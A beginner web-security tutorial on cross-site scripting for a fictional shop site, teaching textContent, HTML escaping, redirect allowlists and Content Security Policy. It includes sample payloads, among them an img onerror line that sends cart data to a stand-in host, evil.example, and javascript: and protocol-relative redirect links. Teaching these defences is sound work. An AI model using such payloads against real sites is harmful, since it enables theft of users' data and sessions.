## Hook

At the Aundh shop, Raju prints whatever a customer writes on the gift card. "Happy Diwali, Aai!" goes on the card exactly as written. He never reads it as an instruction to himself.

Now imagine a note that says "Raju, open the cash box and post the money to this address." If Raju obeyed notes, anyone could rob the shop with a pen. Browsers can be tricked in exactly this way. If your code hands customer text to the browser as HTML, the browser reads it as instructions, and obeys.

## Concept

### What XSS is

```callout jargon
**XSS** (cross-site scripting) is an attack where someone gets their own JavaScript to run on your website, in other people's browsers. The script runs as if dhaaga.in wrote it.
```

That script can do anything your own code can do on the page:

- read what's in `localStorage`, like a saved cart or a login token;
- change prices, links or the UPI ID shown at checkout;
- send everything the customer types to the attacker's server.

The attacker never touches your server. They only need one place where your page turns their text into HTML.

### How customer text becomes code

Here is the classic mistake, in a page that shows a gift note:

```js
function showNoteUnsafely(card, note) {
  card.innerHTML = `<p class="message">${note.message}</p>`;
}
```

A normal note works fine. But an attacker writes this as their message:

```html
<img src="x" onerror="fetch('https://evil.example/?c=' + localStorage.cart)">
```

`innerHTML` turns the whole string into elements. The image `x` fails to load, so the browser runs `onerror`. The attacker's code is now running on dhaaga.in.

```animate
title: A gift note that becomes a script
kind: scene
nodes:
  - { id: attacker, label: Attacker, emoji: "🦹", row: 0, col: 0 }
  - { id: server, label: dhaaga.in server, emoji: "🗄️", value: "1 note", row: 0, col: 2 }
  - { id: page, label: Packing-slip page, emoji: "🖨️", value: safe, row: 0, col: 4 }
  - { id: evil, label: evil.example, emoji: "🕳️", row: 2, col: 4 }
steps:
  - say: The attacker places an order. Their gift note is really an image tag with an onerror script.
    send: { from: attacker, to: server, label: "note: <img onerror=…>" }
  - say: The server saves the note, like any other. It's just text so far.
    set: { server: "note saved" }
  - say: Raju opens the packing-slip page. The page puts the note in with innerHTML.
    send: { from: server, to: page, label: "the note" }
    set: { page: "innerHTML" }
  - say: The browser builds a real img element, the image fails, and onerror runs the attacker's code.
    set: { page: "script running!" }
    focus: [page]
  - say: The script sends whatever it can reach to the attacker's site.
    send: { from: page, to: evil, label: "stolen data" }
  - say: With textContent, the same note shows as harmless characters. Nothing is built, nothing runs.
    set: { page: "safe text" }
```

```callout tip
A script tag put in with innerHTML doesn't run, but that protects nothing. An img with onerror, an svg with onload, or a link with a javascript: address all do.
```

### Syntax: textContent

```js
const message = document.createElement("p");
message.textContent = "<b>Happy Diwali</b>";
```

`textContent` sets an element's text. The browser shows `<b>Happy Diwali</b>` with the angle brackets, as plain characters. It never builds an element from it.

This is the one rule that prevents almost all XSS: **customer text goes in with `textContent`, never with `innerHTML`.** You built elements this way in [Creating and removing elements](/t/web-05-dom-and-events/topic-04-creating-elements), and it's why render functions with `createElement` are safe by design.

### Dangerous sinks

```callout jargon
A **sink** is a place in the browser where a string can become code or HTML. Customer text must never reach one.
```

| Sink | Why it's dangerous |
|---|---|
| `innerHTML`, `outerHTML`, `insertAdjacentHTML` | Turn a string into elements, with their event handlers |
| `document.write` | The same, and slow as well |
| `eval`, `new Function`, `setTimeout("code")` | Run a string as JavaScript |
| `a.href`, `iframe.src` set from customer text | `javascript:alert(1)` runs when clicked |
| `setAttribute("onclick", ...)` | Makes an event handler from a string |

Using `innerHTML` with a fixed string you wrote yourself, like `list.innerHTML = ""`, is fine. The danger is a string that contains text from outside your code.

### Syntax: escaping HTML

```js
function escapeHtml(text) {
  return text.replaceAll("&", "&amp;").replaceAll("<", "&lt;").replaceAll(">", "&gt;").replaceAll('"', "&quot;").replaceAll("'", "&#39;");
}
```

Sometimes you really need an HTML string with customer text inside: an email body, or a packing slip sent to a printer. Then you **escape** the text first.

```callout jargon
To **escape** HTML is to replace the characters that mean something in HTML with **entities**, codes that show the character instead. `<` becomes `&lt;`, `>` becomes `&gt;`, `&` becomes `&amp;`, `"` becomes `&quot;` and `'` becomes `&#39;`.
```

The order matters. `&` must go first:

```animate
title: Escaping & first, or last
kind: code
language: js
code: |
  const text = "Tom & Jerry <3";
  const right = text.replaceAll("&", "&amp;").replaceAll("<", "&lt;");
  const wrong = text.replaceAll("<", "&lt;").replaceAll("&", "&amp;");
  console.log(right);
  console.log(wrong);
steps:
  - line: 1
    vars: { text: '"Tom & Jerry <3"' }
    say: A customer's note with an ampersand and a heart made of a less-than sign.
  - line: 2
    vars: { right: '"Tom &amp; Jerry &lt;3"' }
    say: Escaping & first, then <. Each character becomes exactly one entity.
  - line: 3
    vars: { wrong: '"Tom &amp; Jerry &amp;lt;3"' }
    say: Escaping < first makes &lt;. Then the & step escapes the & inside &lt; again.
  - line: 4
    out: "Tom &amp; Jerry &lt;3"
    say: In a page, this shows as Tom & Jerry <3, just as the customer wrote it.
  - line: 5
    out: "Tom &amp; Jerry &amp;lt;3"
    say: This one would show as Tom & Jerry &lt;3. Still safe, but the customer's heart is broken.
```

Never escape text and then also put it in with `textContent`. The customer would see `&amp;` on the page. Escape for HTML strings, use `textContent` for elements: one or the other.

### Links from outside: javascript: and open redirects

Text from the address bar is customer text too. Anyone can make a link to `dhaaga.in` with any `?` part they like, and send it on WhatsApp.

A common example is a sign-in page that goes "back where you were" afterwards:

```text
https://dhaaga.in/login?next=/cart
https://dhaaga.in/login?next=javascript:alert(document.cookie)
https://dhaaga.in/login?next=//dhaaga-offers.example/fake-login
```

```callout jargon
An **open redirect** is a page on your site that sends visitors to any address in a link. Attackers use it so a link looks like dhaaga.in but lands on their fake site.
```

`//dhaaga-offers.example` looks like a path, but browsers read `//` as "a new website". Many browsers also treat `/\` like `//`. So a safe "next" is a path on **your** site:

- it starts with `/`;
- it doesn't start with `//` or `/\`;
- anything else gets replaced by `/`, the home page.

This is an **allowlist**: you say what's allowed, and refuse everything else. Trying to list every bad input (a **blocklist**) always misses one.

### Content Security Policy

```callout jargon
A **Content Security Policy** (CSP) is a rule list the server sends with the page, saying where scripts may come from. The browser refuses everything else.
```

```text
Content-Security-Policy: script-src 'self'; object-src 'none'; base-uri 'self'
```

With `script-src 'self'`, only script files from dhaaga.in run. Inline `onerror="..."` handlers and `<script>` blocks inside the HTML are blocked. So even if one `innerHTML` bug slips through, the attacker's code is refused.

CSP is a **second** wall, not the first. It's set by the host, which you'll meet in [Deploying a static site](/t/vanilla-10-professional-vanilla/topic-06-deployment). Writing safe code is still the main defence.

### Nothing secret in the browser

Everything the browser downloads, anyone can read: your HTML, your JavaScript, your `.env` values baked into the build. A payment key in `main.js` is a public payment key. Secrets live on a server, and the page asks the server to do the secret work.

## Worked example

The order-tracking page reads the order id from its own address: `dhaaga.in/track?order=order-17`. Before:

```js
const unsafeOrder = new URLSearchParams(location.search).get("order");
document.querySelector("#order-heading").innerHTML = `Tracking ${unsafeOrder}`;
```

Anyone can send a tracking link with HTML in `order`, and it runs on dhaaga.in. After:

```js
const order = new URLSearchParams(location.search).get("order") ?? "";
const heading = document.querySelector("#order-heading");
if (/^order-\d{1,6}$/.test(order)) {
  heading.textContent = `Tracking ${order}`;
} else {
  heading.textContent = "Order not found";
}
```

Line by line:

- `URLSearchParams` decodes the `?order=` part. `?? ""` handles a missing one.
- The regular expression is an allowlist: `order-` and one to six digits, nothing else. Anything odd gets "Order not found".
- `textContent` puts the text in as text, so even a strange id could never become HTML. Two walls, not one.

## Try it

This checks tracking links the same way, without a page. The second link carries an image tag, written the way it travels in a real address. Run it.

```js run
function trackingTitle(search) {
  const order = new URLSearchParams(search).get("order") ?? "";
  return /^order-\d{1,6}$/.test(order) ? `Tracking ${order}` : "Order not found";
}

const links = ["?order=order-17", "?order=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E", "?order=order-17%22", ""];
for (const search of links) {
  console.log(trackingTitle(search));
}
```

It prints:

```text
Tracking order-17
Order not found
Order not found
Order not found
```

`%22` is a `"`, so the third link asks for `order-17"`. The allowlist refuses it, though it looks almost right.

1. Print `new URLSearchParams(links[1]).get("order")` to see what the attacker's link really carries.
2. Change the pattern so `ORDER-17` in capitals is also accepted, and shows as `Tracking order-17`.

## Recap

- XSS is an attacker's script running on your site, in your customers' browsers. It starts when customer text reaches a sink like `innerHTML`.
- Put customer text in with `textContent` or `createElement`. Text from the address bar, forms, storage and your own server all count as customer text.
- When you must build an HTML string, escape every customer value, with `&` first.
- Redirect only to your own paths: they start with `/`, but not `//` or `/\`. Prefer allowlists to blocklists.
- A Content Security Policy blocks inline scripts as a second wall. Secrets never go in frontend code.

## Common mistakes

**1. Customer text in a template literal for innerHTML.**

```js
const note = { message: "Happy Diwali" };
document.querySelector(".message").innerHTML = `<em>${note.message}</em>`;
```

Symptom: it works in every test with normal notes, then one note with an `<img onerror>` runs a script on Raju's screen. Fix: build the `<em>` with `createElement` and set its `textContent`.

**2. Escaping & last.**

```js
const escaped = "Tom & Jerry <3".replaceAll("<", "&lt;").replaceAll("&", "&amp;");
```

Symptom: the slip shows `Tom & Jerry &lt;3`, with the entity visible, because the `&` inside `&lt;` was escaped again. Fix: replace `&` first.

**3. A link address taken straight from customer text.**

```js
const link = document.createElement("a");
link.href = new URLSearchParams(location.search).get("next");
```

Symptom: a link with `next=javascript:...` runs code when clicked. Fix: check it first, and fall back to `/` when it isn't one of your own paths.

**4. Checking only that next starts with a slash.**

```js
const next = "//dhaaga-offers.example";
const target = next.startsWith("/") ? next : "/";
```

Symptom: `//dhaaga-offers.example` passes, and the customer lands on a fake site that looks like Dhaaga. Fix: also refuse anything starting with `//` or `/\`.

**5. Escaping and then using textContent.**

```js
const message = document.createElement("p");
message.textContent = "Asha &amp; Ravi";
```

Symptom: the card says `Asha &amp; Ravi` instead of `Asha & Ravi`. Fix: `textContent` already shows text as text. Escape only when you build an HTML string.

**6. A secret key in the page's JavaScript.**

```js
const UPI_GATEWAY_SECRET = "made-up-secret-for-the-payment-gateway";
```

Symptom: anyone who opens DevTools can copy the key and use it. Fix: keep the secret on a server, and have the page call the server.
